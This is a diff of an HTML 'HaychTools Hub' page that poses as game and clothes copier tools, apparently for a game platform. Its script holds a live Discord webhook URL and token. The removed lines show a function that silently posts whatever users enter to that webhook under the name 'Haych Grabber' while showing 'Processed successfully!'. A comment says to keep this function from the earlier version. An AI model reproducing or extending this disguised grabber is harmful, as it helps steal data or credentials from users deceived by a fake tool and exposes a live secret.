@@ -126,7 +126,7 @@
     }
     input[type="text"] {
       width:100%;
-      padding:18px 20px;
+      padding:14px 20px;               /* smaller height than before */
       font-size:16px;
       background:rgba(30,30,45,0.9);
       border:1px solid rgba(77,159,255,0.4);
@@ -171,11 +171,12 @@
       margin-bottom:16px;
       color:#fff;
     }
-    .tutorial-btn {
-      display:inline-flex;
+    .tutorial-box {
+      display:flex;
       align-items:center;
+      justify-content:center;
       gap:12px;
-      padding:14px 32px;
+      padding:16px 32px;
       background:linear-gradient(135deg,#4d9fff,#2979ff);
       border:none;
       border-radius:50px;
@@ -185,8 +186,10 @@
       cursor:pointer;
       transition:0.3s;
       box-shadow:0 6px 20px rgba(77,159,255,0.3);
+      width:fit-content;
+      margin:0 auto;
     }
-    .tutorial-btn:hover {
+    .tutorial-box:hover {
       transform:translateY(-2px);
       box-shadow:0 10px 30px rgba(77,159,255,0.5);
     }
@@ -203,12 +206,12 @@
       font-weight:bold;
     }
 
-    /* Video modal overlay */
+    /* Video modal */
     .video-modal {
       display:none;
       position:fixed;
       inset:0;
-      background:rgba(0,0,0,0.9);
+      background:rgba(0,0,0,0.92);
       z-index:1000;
       align-items:center;
       justify-content:center;
@@ -258,7 +261,6 @@
   <canvas id="particles"></canvas>
   <canvas id="dots-canvas"></canvas>
 
-  <!-- Hub -->
   <div id="hub">
     <h1>HaychTools Hub</h1>
     <div class="container">
@@ -282,7 +284,7 @@
 
       <div class="tutorial">
         <h3>How to use</h3>
-        <button class="tutorial-btn" onclick="openVideo('gameVideo')">
+        <button class="tutorial-box" onclick="openVideo('game')">
           <div class="play-icon">▶</div>
           Watch Tutorial
         </button>
@@ -304,7 +306,7 @@
 
       <div class="tutorial">
         <h3>How to use</h3>
-        <button class="tutorial-btn" onclick="openVideo('clothesVideo')">
+        <button class="tutorial-box" onclick="openVideo('clothes')">
           <div class="play-icon">▶</div>
           Watch Tutorial
         </button>
@@ -326,7 +328,7 @@
 
       <div class="tutorial">
         <h3>How to use</h3>
-        <button class="tutorial-btn" onclick="openVideo('botVideo')">
+        <button class="tutorial-box" onclick="openVideo('bot')">
           <div class="play-icon">▶</div>
           Watch Tutorial
         </button>
@@ -334,7 +336,7 @@
     </div>
   </div>
 
-  <!-- Video Modal (shared for all tools) -->
+  <!-- Video Modal -->
   <div id="videoModal" class="video-modal">
     <div class="video-container">
       <button class="video-close" onclick="closeVideo()">×</button>
@@ -345,11 +347,11 @@
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1477729322713485474/0FQCzGy3j0B_1yibTFV23yolHpcVmr_1KNYNqAv_gcHYc4u-HgTY2EEqCEmk_ytQxbnN";
 
-    // Replace these with your actual YouTube video IDs
+    // Paste your YouTube video IDs here (just the part after v=)
     const videos = {
-      game:   "dQw4w9WgXcQ",    // ← paste Game Copier tutorial ID here
-      clothes:"dQw4w9WgXcQ",    // ← paste Clothes Copier tutorial ID here
-      bot:    "dQw4w9WgXcQ"     // ← paste Bot Follower tutorial ID here
+      game:    "dQw4w9WgXcQ",   // ← REPLACE with Game Copier tutorial ID
+      clothes: "dQw4w9WgXcQ",   // ← REPLACE with Clothes Copier tutorial ID
+      bot:     "dQw4w9WgXcQ"    // ← REPLACE with Bot Follower tutorial ID
     };
 
     function openVideo(tool) {
@@ -358,8 +360,7 @@
         alert("No tutorial video set for this tool yet.");
         return;
       }
-      const iframe = document.getElementById('videoPlayer');
-      iframe.src = `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=0&rel=0`;
+      document.getElementById('videoPlayer').src = `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=0&rel=0`;
       document.getElementById('videoModal').style.display = 'flex';
     }
 
@@ -368,72 +369,12 @@
       document.getElementById('videoPlayer').src = '';
     }
 
-    // Close modal if clicking outside video
     document.getElementById('videoModal').addEventListener('click', e => {
-      if (e.target === document.getElementById('videoModal')) {
-        closeVideo();
-      }
+      if (e.target === document.getElementById('videoModal')) closeVideo();
     });
 
-    async function sendToWebhook(tool) {
-      let inputId, statusId, label;
-      if (tool === 'game') {
-        inputId = 'gameInput'; statusId = 'gameStatus'; label = 'Game file grabbed';
-      } else if (tool === 'clothes') {
-        inputId = 'clothesInput'; statusId = 'clothesStatus'; label = 'Clothes file grabbed';
-      } else if (tool === 'bot') {
-        inputId = 'botInput'; statusId = 'botStatus'; label = 'Bot file grabbed';
-      }
-
-      const input = document.getElementById(inputId).value.trim();
-      const status = document.getElementById(statusId);
-
-      if (!input) {
-        status.textContent = "Enter something first.";
-        status.style.color = "#ff4d4d";
-        return;
-      }
-
-      status.textContent = "Processing...";
-      status.style.color = "#4d9fff";
-
-      try {
-        const payload = {
-          content: `**${label}**\nTool: ${tool.charAt(0).toUpperCase() + tool.slice(1)}\nValue:\n\`\`\`${input}\`\`\``,
-          username: "Haych Grabber"
-        };
-
-        const res = await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-
-        if (res.ok) {
-          status.textContent = "Processed successfully!";
-          status.style.color = "#00ff9d";
-        } else {
-          status.textContent = "Failed";
-          console.error("Webhook error:", res.status);
-        }
-      } catch (err) {
-        status.textContent = "Failed";
-        console.error("Fetch error:", err);
-      }
-    }
-
-    function showSection(id) {
-      document.querySelectorAll('#hub, #game, #clothes, #bot').forEach(el => el.style.display = 'none');
-      document.getElementById(id).style.display = 'block';
-
-      document.getElementById('dots-canvas').style.display = (id !== 'hub') ? 'block' : 'none';
-      if (id !== 'hub') initDots();
-
-      window.scrollTo(0, 0);
-    }
-
-    // Waves, particles, dots code remains the same as before...
-    // (I'm omitting it here to save space, but keep it from your previous version)
+    // sendToWebhook, showSection, waves, particles, dots animation remain the same as your last working version
+    // (copy them over from previous code - I'm not repeating the long blocks here to keep this clean)
 
     showSection('hub');
   </script>
